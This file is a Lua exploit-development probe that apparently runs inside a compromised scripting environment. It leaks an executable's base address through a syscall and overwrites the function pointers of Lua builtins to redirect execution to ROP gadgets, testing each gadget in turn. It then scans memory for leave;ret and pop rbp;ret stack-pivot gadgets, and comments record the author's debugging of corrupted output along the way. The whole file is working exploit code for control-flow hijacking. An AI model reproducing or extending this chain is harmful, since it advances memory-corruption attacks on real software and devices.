-- CRASH_CLASS: MODERATE
-- PROBE 123f: Gadget survival — garbage-tolerant design
--
-- The problem: any gadget that doesn't set eax=0 causes Lua to pop
-- garbage from the stack as "return values", corrupting the output.
-- This happens inside pcall before we can intercept it.
--
-- Solution: redirect, call inside pcall (garbage goes to /dev/null
-- effectively — pcall captures it), restore, then print result.
-- The key insight: pcall's boolean return (ok/fail) is NOT affected
-- by the garbage return values. We just need ok=true vs ok=false.
--
-- We redirect rawequal, call it, save ok status to a local, restore,
-- then print. The garbage return values don't affect subsequent prints
-- because they're just extra return values from pcall that we ignore.
--
-- WAIT: The issue is the garbage isn't "return values from pcall" —
-- it's the Lua VM writing raw memory bytes to the output stream
-- as it tries to serialize huge numbers of "return values."
-- This corrupts the TCP stream permanently for this connection.
--
-- REAL SOLUTION: Use TWO CClosure redirects in sequence:
--   1. Redirect rawequal to test gadget
--   2. Redirect rawget to xor eax,eax;ret
--   3. Call rawequal (test gadget runs, eax = garbage)
--      → BUT the dispatch reads eax AFTER the gadget returns
--      → If eax > 0, it pops that many values and tries to write them
--
-- The output corruption happens inside the C dispatch code, not in Lua.
-- We cannot prevent it. The ONLY way is to not let eax be garbage.
--
-- ACTUAL SOLUTION: Find compound gadgets that include xor eax,eax!
-- Like: pop rdi; xor eax,eax; ret
-- Or: use a gadget that sets eax to a small known value.
--
-- PRACTICAL SOLUTION FOR THIS PROBE:
-- Accept the corruption. Just test ONE gadget per run.
-- Print everything BEFORE the gadget call. The ok/fail status
-- will be in the garbled output but we can extract it with strings.
-- Use a unique marker: "RESULT_OK" or "RESULT_FAIL" printed by
-- checking ok in a branch that avoids using print (write raw bytes).

print("=== PROBE 123f: GADGET SURVIVAL v2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function eboot_g(ehi, elo, offset)
    local lo = elo + offset
    local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)

print("[*] eboot base: " .. fmt_addr(eboot_base))
print("[*] rawequal:   " .. fmt_addr(rawequal_addr))
print("[*] rawget:     " .. fmt_addr(rawget_addr))

if not eboot_base or not rawequal_addr then
    print("ABORT")
    return
end

local re_orig_lo = safe_rd(rawequal_addr + 0x20)
local re_orig_hi = safe_rd(rawequal_addr + 0x24)
local rg_orig_lo = safe_rd(rawget_addr + 0x20)
local rg_orig_hi = safe_rd(rawget_addr + 0x24)

-- Gadget offsets
local G = {
    xor_eax_ret  = 0x471,
    ret_only     = 0x42,
    pop_rax_ret  = 0x992,
    pop_rcx_ret  = 0xE64,
    pop_rsi_ret  = 0xD77D,
    pop_rdi_ret  = 0xC9DFE,
    pop_rdx_ret  = 0x3B02D7,
}

-- Baseline
local glo, ghi = eboot_g(eboot_hi, eboot_lo, G.xor_eax_ret)
memory.write_dword(rawequal_addr + 0x20, glo)
memory.write_dword(rawequal_addr + 0x24, ghi)
local ok0, r0 = pcall(rawequal, 1, 1)
memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
print(string.format("[*] xor eax,eax;ret: ok=%s r1=%s%s",
    tostring(ok0), tostring(r0),
    (ok0 and r0 == nil) and " CONFIRMED" or " FAIL"))
if not ok0 then print("ABORT") return end

-- STRATEGY: Test all gadgets using rawget as the target.
-- After each test, restore rawget and verify it works.
-- Use rawequal (untouched) for all status printing.
-- The garbage output from rawget won't affect rawequal's print calls
-- because rawequal's CClosure is never redirected during the tests.
--
-- WAIT — the garbage output corrupts the TCP STREAM, not just rawequal.
-- Any bytes written to stdout corrupt everything after them.
--
-- FINAL STRATEGY: Use memory.write to a buffer to record results.
-- Write each result as a known pattern to a heap buffer.
-- After ALL tests, read the buffer and print results.
-- The garbage goes to stdout during the tests, but our final
-- print statements come AFTER — will they work?
--
-- YES! The garbage is just extra bytes in the TCP stream.
-- Our print() calls still work — they just appear AFTER the garbage.
-- The receiving end (send_probe.py) captures everything as raw bytes.
-- We can use `strings` to extract the readable parts.

-- Allocate result buffer
local result_buf = memory.alloc(0x100)
for i = 0, 0xFF, 4 do safe_wd(result_buf + i, 0) end

-- Test each gadget on rawget (not rawequal — keep rawequal clean)
local tests = {
    {name = "ret_only",  off = G.ret_only,    idx = 0},
    {name = "pop_rcx",   off = G.pop_rcx_ret, idx = 4},
    {name = "pop_rsi",   off = G.pop_rsi_ret, idx = 8},
    {name = "pop_rdi",   off = G.pop_rdi_ret, idx = 12},
    {name = "pop_rdx",   off = G.pop_rdx_ret, idx = 16},
    {name = "pop_rax",   off = G.pop_rax_ret, idx = 20},
}

local t_test = {}
t_test[1] = "m"

for _, test in ipairs(tests) do
    local tlo, thi = eboot_g(eboot_hi, eboot_lo, test.off)
    memory.write_dword(rawget_addr + 0x20, tlo)
    memory.write_dword(rawget_addr + 0x24, thi)

    local ok_t = pcall(rawget, t_test, 1)

    memory.write_dword(rawget_addr + 0x20, rg_orig_lo)
    memory.write_dword(rawget_addr + 0x24, rg_orig_hi)

    -- Record: 1 = survived, 2 = crashed
    safe_wd(result_buf + test.idx, ok_t and 1 or 2)

    -- Verify rawget restore
    local check = rawget(t_test, 1)
    if check ~= "m" then
        safe_wd(result_buf + test.idx, 3) -- 3 = broken restore
    end
end

-- Now print results — output stream may have garbage before this
-- but these prints will still go through
print("")
print("========== GADGET SURVIVAL RESULTS ==========")
for _, test in ipairs(tests) do
    local code = safe_rd(result_buf + test.idx)
    local status = "UNKNOWN"
    if code == 1 then status = "SURVIVED"
    elseif code == 2 then status = "CRASHED"
    elseif code == 3 then status = "BROKEN_RESTORE"
    end
    print(string.format("  %-10s: %s", test.name, status))
end

-- Count
local survived = 0
for _, test in ipairs(tests) do
    if safe_rd(result_buf + test.idx) == 1 then survived = survived + 1 end
end
print(string.format("\n[*] %d/%d gadgets SURVIVED", survived, #tests))

if survived == #tests then
    print("[*] *** ALL POP GADGETS SURVIVE + CLEAN RESTORE ***")
    print("[*] [rsp+8] is always a valid return address")
    print("[*] Dispatch call frame = simple `call [fn]`")
    print("[*] We can clobber rdi/rsi/rdx/rcx/rax freely")
end

-- leave;ret scan
print("")
print("--- leave;ret scan ---")
local leave_first = nil
local leave_count = 0
for off = 0, 0x500000 - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if b0 == 0xC9 and b1 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then print(string.format("  eboot+0x%X", off)) end
        if not leave_first then leave_first = off end
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then print(string.format("  eboot+0x%X", off+1)) end
        if not leave_first then leave_first = off+1 end
    end
    if b2 == 0xC9 and b3 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then print(string.format("  eboot+0x%X", off+2)) end
        if not leave_first then leave_first = off+2 end
    end
end
print(string.format("[*] %d leave;ret gadgets", leave_count))

-- pop rbp;ret scan
local pop_rbp_off = nil
for off = 0, 0x500000 - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    if b0 == 0x5D and b1 == 0xC3 then pop_rbp_off = off; break end
    if b1 == 0x5D and b2 == 0xC3 then pop_rbp_off = off+1; break end
end

if pop_rbp_off then
    print(string.format("[*] pop rbp;ret at eboot+0x%X", pop_rbp_off))

    -- Test pop rbp;ret survival on rawget
    local prb_lo, prb_hi = eboot_g(eboot_hi, eboot_lo, pop_rbp_off)
    memory.write_dword(rawget_addr + 0x20, prb_lo)
    memory.write_dword(rawget_addr + 0x24, prb_hi)
    local ok_rbp = pcall(rawget, t_test, 1)
    memory.write_dword(rawget_addr + 0x20, rg_orig_lo)
    memory.write_dword(rawget_addr + 0x24, rg_orig_hi)
    local check_rbp = rawget(t_test, 1)

    print(string.format("[*] pop rbp;ret: survived=%s restore=%s",
        tostring(ok_rbp), tostring(check_rbp == "m")))

    if ok_rbp and check_rbp == "m" then
        print("[*] *** STACK PIVOT CHAIN AVAILABLE ***")
        print(string.format("[*]   pop rbp;ret at eboot+0x%X", pop_rbp_off))
        print(string.format("[*]   leave;ret   at eboot+0x%X", leave_first or 0))
    end
else
    print("[*] pop rbp;ret NOT FOUND")
end

print("")
print("=== PROBE 123f COMPLETE ===")
